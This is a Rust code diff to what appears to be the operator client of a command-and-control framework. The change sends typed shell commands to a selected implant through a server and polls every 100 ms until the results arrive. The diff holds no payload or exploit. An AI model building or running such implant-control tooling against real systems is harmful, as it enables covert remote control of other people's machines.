@@ -2,6 +2,8 @@ use std::{
     env,
     io::{Write, stdin, stdout},
     net::TcpStream,
+    thread,
+    time::Duration,
 };
 
 use common::{Implant, Packet, encode, read_packet};
@@ -51,11 +53,6 @@ fn main() -> Result<(), Box<dyn std::error::Error>> {
         match packet {
             Packet::ImplantList(implant_list) => {
                 implants = implant_list;
-            }
-            Packet::CommandResults { results } => {
-                for (result, _code) in results {
-                    println!("{result}");
-                }
             }
             _ => {}
         }
@@ -115,28 +112,36 @@ fn enter_command_loop(implant_id: usize, implant: &Implant) {
         }
 
         let mut connection = connect();
+        connection
+            .write(
+                encode(Packet::Command {
+                    implant_id,
+                    command: input.to_string(),
+                })
+                .unwrap()
+                .as_slice(),
+            )
+            .unwrap();
+
         if !input.is_empty() {
-            connection
-                .write(
-                    encode(Packet::Command {
-                        implant_id,
-                        command: input.to_string(),
-                    })
-                    .unwrap()
-                    .as_slice(),
-                )
-                .unwrap();
-        }
+            loop {
+                let mut connection = connect();
+                connection
+                    .write(encode(Packet::ResultsRequest).unwrap().as_slice())
+                    .unwrap();
 
-        let packet = read_packet(&mut connection).unwrap();
-
-        match packet {
-            Packet::CommandResults { results } => {
-                for (output, _) in results {
-                    println!("{output}");
+                let packet = read_packet(&mut connection).unwrap();
+                if let Packet::CommandResults { results } = packet
+                    && !results.is_empty()
+                {
+                    for (output, _) in results {
+                        println!("{output}");
+                    }
+                    break;
                 }
+
+                thread::sleep(Duration::from_millis(100));
             }
-            _ => {}
         }
     }
 }
